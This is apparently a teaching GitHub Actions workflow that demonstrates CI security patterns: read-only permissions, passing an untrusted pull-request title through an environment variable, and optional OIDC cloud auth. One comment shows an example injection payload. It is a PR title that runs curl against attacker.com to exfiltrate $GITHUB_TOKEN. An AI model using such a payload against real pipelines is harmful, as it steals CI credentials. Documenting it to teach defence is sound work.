name: "09 · Security Patterns"

permissions:
  contents: read  # set the default permission for all jobs to read-only — the default is broader than most jobs need

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  run-tests:
    runs-on: ubuntu-latest
    permissions:
      contents: read  # explicitly set at job level too — makes intent clear and overrides if the workflow default ever changes
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: "20"
          cache: "npm"
      - run: npm install
      - run: npm test

  injection-safe:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      # UNSAFE: ${{ github.event.pull_request.title }} inline in run: is injectable
      # An attacker can set the PR title to: `"; curl attacker.com?t=$GITHUB_TOKEN; echo "`
      # and that shell code executes because the expression is interpolated raw into the script
      #
      # SAFE: route untrusted data through an env var — the shell sees it as a plain string, not code
      - name: Use env var for user-controlled data
        env:
          PR_TITLE: "${{ github.event.pull_request.title || 'no PR' }}"  # store the untrusted value in an env var first
        run: |
          echo "PR title: $PR_TITLE"  # $PR_TITLE is treated as a string by the shell — cannot be executed as code

  # OIDC: request a short-lived cloud token instead of storing a static secret.
  # Uncomment and configure role-to-assume to use with AWS.
  # oidc-keyless-auth:
  #   runs-on: ubuntu-latest
  #   permissions:
  #     contents: read
  #     id-token: write  # required to request an OIDC token from GitHub's identity provider
  #   steps:
  #     - uses: aws-actions/configure-aws-credentials@v4
  #       with:
  #         role-to-assume: ${{ secrets.AWS_ROLE_ARN }}  # the AWS role that trusts GitHub's OIDC provider
  #         aws-region: us-east-1
